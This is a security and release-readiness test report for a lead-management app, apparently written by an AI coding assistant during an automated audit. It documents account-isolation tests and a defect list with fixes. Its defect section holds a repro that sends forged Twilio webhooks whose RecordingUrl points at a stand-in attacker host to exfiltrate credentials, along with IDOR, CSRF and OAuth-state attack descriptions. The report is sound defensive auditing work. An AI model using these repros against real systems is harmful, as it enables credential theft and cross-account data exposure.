# Plumbline Leads — Release Readiness Test Report

## Overall recommendation: **NO‑GO** (reachable to *Paid Pilot Only* after a short, well‑defined fix list)

Plumbline Leads is close, and its core account‑isolation model is sound and was **empirically proven** in this pass (25 of 26 live cross‑account/auth checks passed). However, the pass found a **confirmed cross‑account data‑exposure defect** (one user can read another user's email content), **no backup/restore procedure**, and **unauthenticated + forgeable Twilio webhooks that can exfiltrate the Twilio credentials**. Each of these independently trips the report's own No‑Go criteria for a payment‑taking pilot. None is large to fix; once the four blockers below are resolved and production persistence is confirmed on the Render dashboard, this becomes a defensible **Paid Pilot Only**.

---

## 1. Run metadata

| Field | Value |
|---|---|
| Date / time | 2026‑08‑30, ~22:00–22:40 America/New_York |
| Tester / tool | Claude Code (automated release‑readiness pass), read‑only + local test harness |
| Repository | `/Users/keithsmith/Documents/claude_app/Plumbline-Leads` |
| Git root | `/Users/keithsmith/Documents/claude_app/Plumbline-Leads` |
| Branch | `main` |
| HEAD commit | `e6db7bb` — "fix: friendly microphone-permission card for call failures" |
| Recent commits | `362fbbd` inbox typography · `0c62648` inbox redesign · `8a01433` voicemail waveform · `1436442` voicemail redesign |
| Remote | `origin https://github.com/Keither85247/plumbline-leads.git` |
| Worktree state | **DIRTY** — 16 modified, 24 untracked (see §3). No changes were committed, pushed, or reverted by this pass. |
| Node / npm | v22.18.0 / 11.5.2 |
| App version (Android) | `versionName 1.1`, `versionCode 12` **(working tree)** — HEAD still declares `versionCode 4`; the bump is uncommitted |
| Android package | `com.plumblineleads.app` |
| Capacitor live‑mode URL | `https://plumbline-leads.vercel.app` (APKs load the deployed frontend on every launch) |
| Environment tested | Local: Vite dev server (frontend) + a lean Node harness mounting the **real** backend route files against a **copy** of the dev SQLite DB. No production systems, no real Twilio/OpenAI/Gmail calls, no production data touched. |

### Environment & safety notes
- All dynamic tests ran against a **backup‑API snapshot** of `backend/leads.db` copied to the scratch directory. The production/dev database was opened read‑only for the snapshot and never modified.
- Two throwaway tester accounts (`tester.a@test.local`, `tester.b@test.local`) plus a deliberately **shared external contact number** were seeded **into the copy only**.
- The full backend (`index.js`) could not be booted locally in reasonable time because the `googleapis` dependency tree stalls for minutes on this machine's file I/O. To still exercise the **real** route handlers, a harness stubbed only the three Gmail/googleapis modules and mounted the genuine `requireAuth` + data routers against the DB copy. This exercises the actual account‑scoping SQL — which is the property under test — without the unrelated I/O stall. Twilio‑webhook and transcription routes were reviewed statically (they require real Twilio/OpenAI).

---

## 2. Test matrix summary

| Outcome | Count |
|---|---|
| ✅ Passed automatically | 34 |
| ✅ Passed via browser interaction | 9 |
| 📱 Requires a physical Android phone | 7 |
| ☎️ Requires a real Twilio call/SMS | 16 |
| 🔑 Blocked by missing credentials/config | 6 |
| ❌ Failed — confirmed defect | 1 (plus 6 other confirmed security/ops defects found by static review) |

"Failed" counts the one **behavioural** test that failed live (emails cross‑account leak). The other Critical/High defects in §6 were found by verified static review and are not double‑counted as failed dynamic tests.

---

## 3. Phase 1 — Repository & configuration

| Check | Result | Evidence |
|---|---|---|
| Correct repo / git root | ✅ Pass | root = repo path; `main` @ `e6db7bb` |
| Branch / HEAD / remote / recent commits | ✅ Pass | see §1 |
| Modified / untracked files | ⚠️ Noted | 16 modified, 24 untracked. Untracked include the Android native project and the mic‑fix native bridge. |
| Root/backend/frontend package scripts | ✅ Pass | frontend: `build`, `android:build`, `android:open`, `android:run`. No `test`/`lint`/`typecheck` scripts anywhere. |
| Node/npm versions | ✅ Pass | v22.18.0 / 11.5.2 |
| Dependency install state | ✅ Pass | frontend & backend `node_modules` present; build + requires succeed |
| `.env.example` completeness | ⚠️ Partial | Root `.env.example` exists (15 backend keys) and has **no stale keys**, but it omits optional flags (`SENTRY_DSN`, `GMAIL_OAUTH_ENABLED`, `ALLOW_PUBLIC_SIGNUP`, `ENABLE_TESTER_BYPASS`, `DEMO_EMAIL`, `DB_PATH`, `SMS_*`, VAPID/FIREBASE push keys). **No `frontend/.env.example`** — all `VITE_*` vars undocumented. |
| No secrets tracked by Git | ✅ Pass | `.env` files and `leads.db` are gitignored; no `*.pem/*.keystore/serviceAccount` tracked. `twilio_2FA_recovery_code.txt` exists in the working dir but **is gitignored** (not in the repo). It was **not opened/read** by this pass. |
| Android versionCode / versionName | ⚠️ Noted | `12` / `1.1` in working tree; HEAD = `4`. Bump uncommitted. |
| Capacitor live‑mode URL | ✅ Pass | `server.url = https://plumbline-leads.vercel.app` |
| Android package ID | ✅ Pass | `com.plumblineleads.app` (namespace + applicationId) |
| Merged manifest permissions | ✅ Pass | debug merged manifest includes `RECORD_AUDIO`, `MODIFY_AUDIO_SETTINGS`, `INTERNET`, `ACCESS_NETWORK_STATE`, `POST_NOTIFICATIONS` (+ `FOREGROUND_SERVICE[_MICROPHONE]`, `WAKE_LOCK`, `VIBRATE`, `USE_FULL_SCREEN_INTENT`) |
| Native App‑Settings plugin registered & compiles | ✅ Pass (compiles) | `AppSettingsPlugin.java` registered in `MainActivity.onCreate`; `compileDebugJavaWithJavac` exits 0 |
| Native Settings bridge committed vs local‑only | ❌ **Local‑only** | `frontend/android/app/src/main/java/com/plumblineleads/app/MainActivity.java` and `AppSettingsPlugin.java` are **untracked** (`git status ??`). The entire `.../java/` tree is untracked. A fresh clone would build **without** the Settings bridge. |

**Stale/misleading documentation flagged (not modified):** `README.md` describes an obsolete version; `ANDROID_RELEASE.md` predates Capacitor live‑mode and its rebuild instructions are now misleading and don't mention the MicPermissionCard; `GOOGLE_TESTING_CHECKLIST.md` referenced `/health` instead of `/api/health` (corrected in this pass — see §11). Stray files `MEMORY copy.md` present.

---

## 4. Phase 2 — Automated checks

| Command | Exit | Result |
|---|---|---|
| `SENTRY_AUTH_TOKEN="" npm run build` (frontend, `frontend/`) | 0 | ✅ Pass. Warm ≈1.75s; a cold run measured 5m34s (slow file I/O on this host, **not** a failure). Bundle ~848 KB JS (chunk‑size warning only). |
| Backend JS syntax — `node --check` over all 32 non‑`node_modules` `.js` | 0 | ✅ **32/32 pass** |
| `git diff --check` | 0 | ✅ Clean (no whitespace/conflict markers) |
| Gradle `compileDebugJavaWithJavac` (Android, via Android Studio JBR) | 0 | ✅ Pass (JAVA_HOME must point at the bundled JBR; system `java` is absent) |
| Merged‑manifest inspection | — | ✅ Pass (see §3) |
| Missing‑translation‑key scan (custom, authoritative) | — | ⚠️ 38 referenced keys missing from **both** `en` and `es`; all have inline English fallbacks. `en`/`es` are symmetric (483 keys each). See §7. |
| Dead‑import / orphan scan | — | ⚠️ Two orphan components (`OnboardingModal.jsx`, `onboarding/slides/PricingSlide.jsx`) confirmed present and unreferenced. |
| Unit / integration tests | 🔑 N/A | **No test framework exists** in the repo (no `test`/`lint`/`typecheck` scripts, no tsconfig despite `typescript ^6` dep). None added (per task). |

---

## 5. Phases 3–6 — Functional testing performed

### 5a. Authentication & account separation (Phase 3) — **live against real route handlers**
Harness mounted the genuine `requireAuth`, `requireOwner`, and data routers against the DB copy; Tester A = user 2, Tester B = user 3, sharing external number `+15557654321`.

| Test | Result | Evidence |
|---|---|---|
| Valid login (A, B) | ✅ Pass | 200 + session token issued for both |
| Invalid login | ✅ Pass | wrong password → **401** |
| `/auth/me` restores session | ✅ Pass | 200, returns id=2 for A's token |
| Protected route without token | ✅ Pass | `GET /api/leads` → **401** |
| Invalid/expired bearer token | ✅ Pass | → **401** |
| Logout invalidates session | ✅ Pass | after `POST /auth/logout`, A's token → **401**; B's session still 200 |
| Owner‑only: `/api/migrate` rejects tester | ✅ Pass | **403** |
| Owner‑only: `/api/admin/reset-demo` rejects tester | ✅ Pass | **403** |
| Owner‑only: `/api/admin/users`, `/api/admin/phone-numbers` reject tester | ✅ Pass | **403** (all `admin.js` routes are `requireOwner`) |
| A cannot read B's **leads** | ✅ Pass | A's list = only A's; B's = only B's |
| A cannot mutate/delete B's lead | ✅ Pass | `PATCH /api/leads/15/status` & `DELETE /api/leads/15` → **404**; B's lead survived unchanged (scoped `UPDATE ... AND user_id=?` then `changes===0 → 404` before any re‑fetch) |
| A cannot read B's **lead voicemail** | ✅ Pass | `GET /api/leads/15/voicemail` → **404** (`WHERE id=? AND user_id=?`) |
| A cannot read B's **messages** (shared number thread) | ✅ Pass | A's thread shows only "A private message" |
| A cannot read B's **calls** (shared number) | ✅ Pass | A's by‑phone calls exclude B's CallSid |
| A cannot fetch B's **call recording** | ✅ Pass | `GET /api/calls/<B_id>/recording` → **404** (ownership‑checked before proxy) |
| A cannot read B's **contacts** | ✅ Pass | shared‑number contact returns A's, not B's |
| A cannot read B's **assigned number** | ✅ Pass | `/api/numbers/mine` returns A's own only |
| A cannot read B's **voicemail greeting** | ✅ Pass | `/api/settings` returns A's greeting only |
| Two accounts, same external contact → independent activity | ✅ Pass | A holds 2 leads, B holds 1, for the same number, fully separated |
| Counts scoped per account | ✅ Pass | A's `/api/counts` = calls:1, texts:1, emails:1 (A's own) |
| A cannot read B's **emails** (list) | ✅ Pass | A's email list excludes B's |
| A cannot read B's **email via PATCH** | ❌ **FAIL** | `PATCH /api/emails/75` (B's email) as A → **HTTP 200 returning B's full email** (subject "B PRIVATE subject", body "B secret email body"). See DEF‑1. |

Duplicate‑detection / message‑count / SMS‑to‑lead / caller‑classification scoping: **Static Review Only** — all such queries in `leads.js`, `messages.js`, `calls.js`, `twilio.js` filter by `user_id`/assigned number; confirmed by review, not individually exercised end‑to‑end.

Demo reset cannot modify tester data: **Static Review Only** — `admin.js` `reset-demo` wipes only rows `WHERE user_id = <demo user id>` inside a transaction; `requireOwner`‑gated. Not executed.

### 5b. Lead & navigation flows (Phase 4) — **browser**
Logged in as Tester A in the in‑app browser (frontend proxied to the harness).

| Test | Result | Evidence |
|---|---|---|
| Empty‑state rendering | ✅ Pass (browser) | "No entries yet." shown before data matched the tab |
| Lead list loads | ✅ Pass (browser) | 2 lead cards render (A Lead One/Two) with NEW status glow, phone accents, "More details" |
| Cross‑account isolation visible in UI | ✅ Pass (browser) | B's lead never appears in A's list |
| English & Spanish render without **blank** strings | ✅ Pass (browser) | ES tabs: Clientes / Clientes existentes / Proveedores / Spam / Otro / Archivados. ~38 keys fall back to English text (see §7) — cosmetic, not blank |
| 320 px layout — no horizontal overflow | ✅ Pass (browser) | `scrollWidth === innerWidth === 320` on Leads and on the mic card |
| Nav renders / safe areas | ✅ Pass (browser) | bottom nav pill + badges visible, not clipped |
| Create/status/category/archive/restore/delete, contact edit, recents/timeline order, missed‑call & voicemail linking, refresh‑no‑duplicate, repeat‑call rows, skip‑note keeps history | 📱/☎️ Manual | Require real call/SMS data and/or a device; procedures in §9. Status/delete scoping proven at API layer (§5a). |

### 5c. Microphone‑permission experience (Phase 5)
| Test | Result | Evidence |
|---|---|---|
| Non‑permission failures show the generic warning | ✅ Pass (browser) | With no token endpoint, the UI showed "Call failed — Failed to fetch voice token" + Retry (generic toast), **not** the mic card |
| Classifier recognizes 31401 / PermissionDeniedError / NotAllowedError / nested `originalError` | ✅ Pass (auto) | 21‑case truth table over the committed `isMicPermissionError` (all pass); re‑verified this pass |
| Unrelated token/network/transport errors **not** misclassified | ✅ Pass (auto) | token/20104/31009/31005/53000/timeout/401 all → not mic |
| Exactly one warning card; no raw code in UI | ✅ Pass (browser) | `role="alert"` count = 1; no `31401`/`PermissionDenied`/`NotAllowed` text in DOM; generic toast suppressed while card shown |
| English & Spanish copy correct | ✅ Pass (browser) | EN + ES verified; all 6 `callsMic*` keys present in both languages |
| "Not now" dismisses; "Try Again" re‑probes without duplicate Device | ✅ Pass (auto/browser) | dismiss clears card; retry probes `getUserMedia`, guarded so it never stomps an in‑flight call, no duplicate Device |
| Card respects narrow screens & safe areas | ✅ Pass (browser) | no overflow at 320px; top offset uses `env(safe-area-inset-top)` |
| No dead "Open Settings" in a normal browser | ✅ Pass (browser) | web shows address‑bar hint, no Settings button |
| Settings button only when native plugin available | ✅ Pass (review) | `canOpenAppSettings()` = native Android **and** `Capacitor.isPluginAvailable('AppSettings')` |
| Native bridge targets this app's App Info page | ✅ Pass (review) | `ACTION_APPLICATION_DETAILS_SETTINGS` + `package:` URI from `getPackageName()` |
| Actual App Info deep‑link launch | 📱 **Physical device required** | Not verifiable off‑device |

Minor: the classifier does not inspect `err.cause.message` (only `err.cause.name`); a permission error surfaced solely as a `cause.message` string could be shown via the generic path (Low — see DEF‑L cluster).

### 5d. Recording & voicemail playback (Phase 6)
| Test | Result | Evidence |
|---|---|---|
| Player renders only when a recording/voicemail exists | ✅ Pass (review) | `CallsPage`/voicemail row gate on `recording_url`/audio presence |
| Authenticated media uses Safari/ITP token fallback | ✅ Pass (review) | `requireAuth` accepts `?token=` for `<audio>`/`<video>` (see security caveat DEF‑7) |
| Tester A cannot request Tester B's recording | ✅ Pass (live) | `GET /api/calls/<B_id>/recording` → 404 (ownership‑checked) |
| Server forwards `Range`; 206 / `Content-Range` / `Content-Length` / `Content-Type` / `Accept-Ranges` handled | ✅ Pass (review) | `leads.js` voicemail proxy + `calls.js` recording proxy forward `Range`, set `Accept-Ranges`, pass 206/Content‑Range (confirmed in prior verification and re‑read this pass) |
| Missing recording returns clean error, no credential exposure to the browser | ✅ Pass (review) | proxies return 404/502 JSON; Twilio Basic‑auth used server‑side only |
| Twilio credentials never reach the browser | ✅ Pass (review) | credentials built and used server‑side in the proxy only |
| Real Twilio‑media play/pause/seek/replay/switch | ☎️ Manual | requires real recordings + credentials; procedure in §9 |

**Caveat (see DEF‑2/DEF‑7):** although ownership is enforced, the proxy attaches the Twilio auth token to whatever host `recording_url` points at, and `recording_url` is writable by unauthenticated webhooks — a real risk documented below.

---

## 6. Defects

Severity legend: **Critical** (data exposure/loss, credential compromise, auth bypass), **High**, **Medium**, **Low**. "Blocks pilot" = must fix before taking a paying customer.

### DEF‑1 — Cross‑account email disclosure via `PATCH /api/emails/:id` — **Critical — ✅ RESOLVED (verified 2026‑09‑07)**
- **Status:** Fixed in `backend/routes/emails.js` and verified by an automated isolation test (11/11 pass on the fix; the same test fails 5/11 on the pre‑fix code, reproducing the leak). Was previously "BLOCKS PILOT". Note: other blockers (DEF‑2/3/4/5) remain, so the overall recommendation is unchanged.
- **Environment:** backend, all deployments. **Confirmed live** in the original pass (the one failed dynamic test).
- **Preconditions:** any two authenticated accounts; attacker knows/guesses a numeric email id (sequential, enumerable).
- **Repro:** As Tester A, `PATCH /api/emails/75` (an email owned by Tester B) with body `{"is_read":true}`.
- **Expected:** 404/403; no data returned.
- **Actual:** **HTTP 200 with Tester B's full email row** (subject, `body_preview`, addresses, etc.).
- **Cause:** `backend/routes/emails.js:246` — the `UPDATE` is correctly scoped (`WHERE id = ? AND user_id = ?`) but the response re‑fetch is **not**: `SELECT * FROM emails WHERE id = ?` (no `user_id`, no `changes===0` guard). Contrast `leads.js:411‑434`, which returns 404 when `changes===0` **before** its re‑fetch and is therefore safe.
- **Suggested fix (one line):** guard on `result.changes === 0 → 404` before the re‑fetch, or add `AND user_id = ?` to the `SELECT`.
- **Blocks pilot:** ~~Yes — confirmed cross‑account data exposure.~~ **Resolved.**
- **Fix applied (2026‑09‑07):** re‑fetch scoped to `WHERE id = ? AND user_id = ?` (`backend/routes/emails.js`, PATCH `/:id`). Missing and foreign ids now both return an identical `404 {"error":"Email not found"}`, so the response never reveals whether a foreign id exists. No owner bypass was added (owners are `user_id`‑scoped here exactly like the existing `GET /:id`).
- **Verification:** `node backend/scripts/test-emails-isolation.js` — hermetic temp DB, real `emails` router behind real `requireAuth`, two seeded accounts (A = owner, B = tester). Results: **11/11 pass** on the fix; **6 pass / 5 fail** when the fix is reverted (tests 2, 3, 5b, 6, 9 fail and the leak is reproduced — `PATCH` on B's email returns B's `subject`/`body_preview`/`user_id`). Proves: (1) A updates+receives own email; (2) A cannot update B's; (3) no B content in the response; (4) B's stored row unchanged; (5) missing == foreign 404; (6) owner does not bypass ownership. Adjacent `GET /:id` and `DELETE /:id` re‑verified scoped; the non‑owner direction (B→A) also blocked.
- **Adjacent review:** the only exploitable instance was this one. `leads.js` PATCH re‑fetches (`:426/:453/:476`) share the shape but are guarded by a scoped `UPDATE` + `changes===0 → 404` before the read (latent only — see the Info finding); `POST` re‑fetches use `lastInsertRowid` of a just‑inserted owned row (safe); `admin.js` `phone_numbers` reads are owner‑only by design. None changed.

### DEF‑2 — Forgeable Twilio webhooks → SSRF exfiltration of Twilio credentials — **Critical — ✅ RESOLVED (verified 2026‑09‑07)**
- **Status:** Fixed and verified by an automated adversarial test (`backend/scripts/test-twilio-security.js`, **34/34 pass**) plus the unchanged email‑isolation test (11/11). Covers signature validation, the retired paid‑call endpoint, recording‑URL SSRF hardening, owner‑only diagnostics, and the dev‑bypass fail‑safe. Was previously "fix before exposing webhooks".
- **Environment:** backend production (public webhook routes).
- **Cause:** No `X-Twilio-Signature` validation anywhere (`routes/twilio.js`, `routes/mmsDelivery.js`; repo‑wide grep for `validateRequest`/signature = 0 hits). `/api/twilio/voicemail` and `/recording` take `RecordingUrl` **from the request body** and pass it to `attemptDownload` (`twilio.js:110‑138`), which sends `Authorization: Basic base64(TWILIO_ACCOUNT_SID:TWILIO_AUTH_TOKEN)` to **any host** — no allowlist (`url.startsWith('https') ? https : http`).
- **Repro:** unauthenticated `POST /api/twilio/voicemail?user_id=<n>` with `RecordingUrl=https://attacker.example/x` → server ships live Twilio credentials to attacker host; also injects a voicemail/lead into account `<n>`.
- **Impact:** full Twilio account takeover (toll fraud, SMS as the business, read all recordings), plus forged calls/SMS/leads into any account.
- **Suggested fix:** add Twilio signature validation middleware to all `/api/twilio/*` webhook routes; pin the media host to `api.twilio.com` before attaching credentials.
- **Blocks pilot:** ~~Practically yes…~~ **Resolved.**
- **Fix applied (2026‑09‑07):**
  - **Retired the public paid‑call door.** `POST /api/twilio/outbound` was mounted before the global auth middleware and called `client.calls.create()` with the global `CONTRACTOR_PHONE_NUMBER` — any anonymous caller could make the server place a paid call. It now returns **410 Gone** and contains **no** `calls.create` in code (test asserts this). Its only caller was the dead frontend `initiateCall()`, removed from `frontend/src/api.js`. The active outbound path (Voice SDK → `/api/twilio/voice-client`) is untouched.
  - **Signature validation on every genuine webhook.** New `backend/middleware/verifyTwilioSignature.js` (Twilio's official `validateRequest`) is applied to `/voice`, `/missed-call`, `/sms`, `/voicemail`, `/recording`, `/voice-client`, and `/outbound-bridge`. Missing/invalid `X‑Twilio‑Signature` → **403 before any DB write, OpenAI call, download, push, or REST action**. It runs after `express.urlencoded` so form bodies validate, reconstructs the signed URL as `TWILIO_BASE_URL + req.originalUrl` (so query‑string webhooks like `/voicemail?user_id=N` validate correctly and Render's proxy host/scheme is never trusted — no `trust proxy` needed), never logs the token or signature, **fails closed** in production if `TWILIO_AUTH_TOKEN`/`TWILIO_BASE_URL` are missing, and honors a **dev‑only** `TWILIO_SKIP_WEBHOOK_VALIDATION` that cannot activate when `NODE_ENV=production`. The tokenized greeting‑audio route and `/token` are intentionally excluded.
  - **Recording‑URL SSRF closed.** New shared helper `backend/utils/twilioRecording.js`: prefers deriving the canonical media URL from the trusted `RecordingSid` + configured `TWILIO_ACCOUNT_SID`; otherwise strictly validates a supplied URL (https only, host **exactly** `api.twilio.com`, no userinfo, no odd port, exact Twilio recording path, path Account SID must equal the configured one). Credentials are attached only after validation; `https.get` does not follow redirects, so creds are never forwarded to a 3xx target. Applied in the two webhooks **and** both authenticated playback proxies (`calls.js /:id/recording`, `leads.js /:id/voicemail`), which keep their `user_id` scoping.
  - **Diagnostics locked down.** `GET /api/twilio/diag` now requires an authenticated **owner** (`requireAuth` + `requireOwner`); anonymous → 401, tester → 403.
- **Verification:** `node backend/scripts/test-twilio-security.js` → **34/34 pass**, covering all 15 required proofs (missing/invalid/valid signatures incl. query‑string URLs and URL‑bound signatures; no side effects on rejection; `/outbound` 410 with no `calls.create`; attacker/lookalike/http/localhost/private‑IP/metadata/credential/port/redirect‑style/wrong‑account/malformed recording URLs rejected; legit recording accepted; credentials only to approved destinations; playback proxy `user_id` enforcement; owner‑only diag; prod ignores the dev bypass). Valid signatures generated with Twilio's official `getExpectedTwilioSignature`; no network/Twilio/OpenAI contact (stubbed). Email‑isolation test still 11/11; frontend build exit 0; `git diff --check` clean.
- **Deploy prerequisites (Render/Twilio):** `TWILIO_AUTH_TOKEN` and `TWILIO_BASE_URL` must be set (base URL = the exact public https origin Twilio calls, no trailing slash) or webhooks fail closed. The Twilio Console webhook URLs and the TwiML App voice URL must point at `TWILIO_BASE_URL` paths. No `trust proxy` change required. Auth‑token rotation is **recommended** post‑deploy since the pre‑fix SSRF could have leaked it (no evidence it was; the endpoint was newly written), and rotating is safe because the same token drives both REST and signature validation.

### DEF‑3 — Public, unauthenticated, unlimited `/api/transcribe` — **Critical (cost/DoS) — ✅ RESOLVED (verified 2026‑10‑05)**
- **Cause:** mounted **before** global `requireAuth` (`index.js:237‑239`); no auth, no rate limit, no per‑user scoping; accepts audio uploads and calls OpenAI Whisper. Also allows unauthenticated lead creation (`user_id NULL`, re‑stamped to the owner on every boot by `db.js`).
- **Impact:** anyone can drive unbounded OpenAI spend and fill disk; unscoped lead injection.
- **Fix applied (2026‑10‑05):** `/api/transcribe` is mounted **after** `requireAuth`; leads are created with `userId: req.userId` only (body‑supplied ids ignored); `createLeadFromTranscript` now **throws** without a positive‑integer owner, so no caller can create an ownerless lead; multer limited to 1 file / 5 small fields; the renamed temp file is removed on error (previously leaked); raw error text is no longer returned. The only frontend caller (`AudioUploadForm`, rendered hidden) now sends the session.
- **Not done here:** a per‑user rate limit / quota on transcription (and on `POST /api/leads`, `/api/translate`) — still recommended (DEF‑7). **Update 2026‑10‑07 (DEF‑10):** `/api/transcribe` and manual `POST /api/leads` now share a per‑account + global AI budget; `/api/translate` is still uncapped.
- **Verification:** `node backend/scripts/test-account-isolation.js` checks B1–B5 (anonymous 401 with no lead and no OpenAI call; authenticated lead owned by the caller with a body `userId` ignored; missing owner refused).
- **Blocks pilot:** ~~Yes~~ **Resolved** (rate limiting remains a DEF‑7 hardening item).

### DEF‑4 — No production backup or restore procedure — **Critical — BLOCKS PILOT**
- **Cause:** `scripts/export-db.js` is a one‑way **local→prod** importer (`POST /api/migrate`), not a backup; no scheduled dump, `.backup()`/`VACUUM INTO` snapshot, off‑disk copy, or documented restore anywhere. The `/api/migrate` endpoint remains mounted in production despite its "REMOVE AFTER USE" banner (`index.js:265‑286`).
- **Impact:** a paid pilot with no viable recovery path — explicit No‑Go criterion.
- **Fix:** scheduled `db.backup()` to `/data/backups/` shipped off‑disk; documented one‑command restore; remove `/api/migrate`.
- **Blocks pilot:** Yes.

### DEF‑5 — Production SQLite persistence unverified (silent ephemeral fallback) — **Critical if misdeployed — MUST CONFIRM**
- **Cause:** `db.js:6` = `process.env.DB_PATH || path.join(__dirname,'leads.db')`. With `DB_PATH` unset the DB is written **inside the code tree** (ephemeral, lost on deploy) with **no startup log and no production assertion**. `render.yaml` **does** declare the correct setup (`plan: starter`, `disk` at `/data` 1 GB, `DB_PATH=/data/leads.db`), but that is authoritative only if the live service was actually created/synced from this Blueprint. Prior‑session behaviour (Render cold‑start "Failed to fetch") is consistent with a **free‑tier** service, which would contradict `render.yaml` and mean data loss on every deploy.
- **Fix:** confirm on the Render dashboard that the live service is Starter+ with the disk mounted at `/data` and `DB_PATH=/data/leads.db`; add a boot‑time assertion that logs the resolved path and fails loudly if it is not the persistent one.
- **Blocks pilot:** Yes until confirmed. (Note: this is also why the "cold start drops webhooks" hypothesis was **refuted** — `render.yaml`'s Starter plan does not spin down; verify the live plan matches.)

### DEF‑6 — Session tokens can leak to Sentry via `?token=` URLs — **High**
- **Cause:** media/recording URLs embed the session token as `?token=` (`requireAuth` fallback for `<audio>`/`<video>`), and Sentry browser tracing (`tracesSampleRate: 1.0`, `main.jsx`) instruments fetch/resource spans; backend Sentry may capture query strings. Combined with `Sentry.setUser({email})` (no `beforeSend` scrubbing), tokens + PII can reach Sentry.
- **Fix:** prefer a short‑lived, path‑scoped media token (not the session token) in URLs; add a Sentry `beforeSend` that strips `token` query params and drops PII; lower `tracesSampleRate`.
- **Blocks pilot:** No (gated by `VITE_SENTRY_DSN`), but fix early.

### DEF‑7 (cluster) — High/Medium operational & security hardening — **do before/early in pilot, not blocking a *supervised* start**
- ~~**High — No login rate limiting** (`auth.js`): brute‑force/credential‑stuffing possible.~~ **✅ Resolved 2026‑10‑07 (DEF‑10):** per‑IP, per‑/48, per‑email+IP and per‑email limits (no global cap); in‑memory, see DEF‑10 for restart/scaling behaviour.
- **High — CORS dev fallback reflects any origin with credentials** when `FRONTEND_URL` is unset (`index.js:129‑168`): safe only if `FRONTEND_URL` is set in prod — **verify it is set**.
- ~~**Medium — Public `/api/health/owner`** discloses owner email, id, and user count; `/api/health/env` exposes feature‑flag state.~~ **✅ Resolved 2026‑10‑05 (DEF‑8):** public `/api/health` returns only `{"ok":true}`; `/env` and `/owner` are owner‑only.
- **Medium — Outbound calling has no rate/abuse guard or international block** (SMS has `smsGuards`, calling does not).
- **Medium — `/api/translate` authenticated but uncapped** (OpenAI cost by any tester). *Still open after DEF‑10* (transcription and manual transcripts are now budgeted; translate is not).
- **Medium — SameSite=None cookie, no CSRF protection**; multipart `/api/messages/send` is CSRF‑reachable.
- **Medium — OpenAI outage silently drops** voicemail/answered‑call recordings (`recording_url` persisted only on the transcription success path, `twilio.js:478‑629`).
- **Medium — Gmail poller advances a global `lastPollTime`** even after a per‑user fetch error (`jobs/gmailPoller.js`), permanently skipping that user's messages in the errored window.
- **Medium — PII in Sentry:** user email via `setUser`; customer phone numbers / CallSids via console breadcrumbs.

### DEF‑8 — Account‑isolation & public‑surface defects (Play release audit) — **Critical/High — ✅ RESOLVED (verified 2026‑10‑05)**
- **Scope:** five findings from the 2026‑10‑04 Google Play release audit, plus adjacent queries with the same ownership error. Work‑tree edits that already scoped classification/dedupe/message counts and gated `/api/migrate` were verified, tightened (`user_id IS ?` → `user_id = ?` so a missing account matches nothing), and committed with the rest.
- **1. Health disclosure (High):** `GET /api/health/owner` (owner email, id, password flag, user count, raw DB errors) and `/api/health/env` (config flags) were public. → New `routes/health.js`: public router mounted before `requireAuth` returns only `{"ok":true}` (Render `healthCheckPath` and the frontend status/warm‑up pings read `res.ok` only); `/env` and `/owner` mounted after `requireAuth` behind `requireOwner`; generic error text. *Root cause:* a temporary reset diagnostic registered in the public section with a comment wrongly calling it safe.
- **2. Transcription:** see DEF‑3.
- **3. Push (High):** `sendPush` fanned out to subscriptions with `user_id IS NULL` and broadcast to **all** subscriptions when called with a null user; logout left the device registered, so a logged‑out phone/browser kept receiving call and voicemail notifications (caller numbers, AI summaries). → `pushService` selects `user_id = ?` only and refuses a missing/invalid id (no broadcast mode); `POST /auth/logout` deletes this device's web endpoint/FCM token **scoped to the session's own account**; the frontend sends them at logout, re‑binds an existing web subscription and re‑sends the stored FCM token on sign‑in (fixes shared devices and the pre‑login 401 token loss). Push routes were already behind `requireAuth` and user‑scoped (refuted as unauthenticated). *Root cause:* a broadcast/NULL fallback left from single‑user days and no device cleanup on logout.
- **4. Cross‑account queries (High):** caller classification, SMS→lead association, duplicate and same‑day checks, lead `message_count`/`last_message_at`, the messages list and unread count (`OR user_id IS NULL`), vendor‑voicemail call enrichment, `ensure-logged` (returned/enriched another account's call id) and `outbound-note` (could claim ownerless call rows by phone or CallSid) → all now `user_id = ?`. Inbound SMS/voicemail with no verified owning account, and answered‑call recordings with no owned call row, now create nothing (no ownerless rows, no paid transcription). *Root cause:* queries written for a single account, keyed by phone or CallSid without the tenant boundary. No owner bypass exists or was added.
- **5. `/api/migrate` (High):** any logged‑in tester could bulk‑insert ownerless leads/calls in deployed code. → moved to `routes/migrate.js`, owner‑only, and every imported row is stamped with the owner's `user_id` (body‑supplied ids ignored). Still recommended for removal (DEF‑4).
- **Verification (2026‑10‑05):** new hermetic `backend/scripts/test-account-isolation.js` — **60/60 pass** (temp DB, synthetic owner + two testers, real routers over HTTP, OpenAI/Gmail/web‑push/Firebase/Twilio‑media stubbed, no network). Mutation check: each of **26** individual fixes reverted one at a time → **26/26 caught**. Existing suites unchanged: `test-twilio-security.js` **34/34**, `test-emails-isolation.js` **11/11**. Backend `node --check` clean; frontend production build exit 0; `git diff --check` clean.
- **Legacy data (not migrated — owner action):** existing `push_subscriptions` / `fcm_subscriptions` rows with `user_id IS NULL` are now ignored (never targeted) but remain stored. Since DEF‑10 the owner‑only, read‑only `GET /api/health/push-inventory` reports their counts (counts only, no endpoints/tokens); deleting them remains a deliberate owner decision. `db.js` still re‑stamps any `user_id IS NULL` lead/call/message row to the owner **on every boot**; no new code path creates such rows, but the boot stamping should become a one‑time, recorded migration.

### DEF‑9 (cluster) — Found during DEF‑8, **not fixed** (outside the five findings)
- ~~**High — Gmail OAuth state is one global in‑memory slot** (`routes/auth.js` `pendingState`): an attacker who starts `/auth/google` and gets a victim to consent can attach the victim's Gmail (read+send) to the attacker's account; concurrent connects clobber each other.~~ **✅ Resolved 2026‑10‑07 (DEF‑10).**
- **High — Inbound calls/SMS/voicemail to an unassigned number route to the owner** (`getAssignedUserForNumber` fallback; documented behaviour, see DEF‑L), including numbers left unassigned after a tester is removed — their customers' data then lands in the owner account. Changing routing could make the owner miss real calls, so it needs an owner decision on which number is the owner line.
- **Medium — Testers without an assigned number send SMS / place calls from the shared owner number** (`messages.js` send, `/voice-client`), so customer replies land in the owner account.
- ~~**Medium — Suspension not enforced at login/auth** (`is_suspended` only blocks SMS and number claims).~~ **✅ Resolved 2026‑10‑07 (DEF‑10)** for sign‑in, sessions and outbound calling (inbound routing/push/Gmail sync for suspended accounts still open — see DEF‑10).
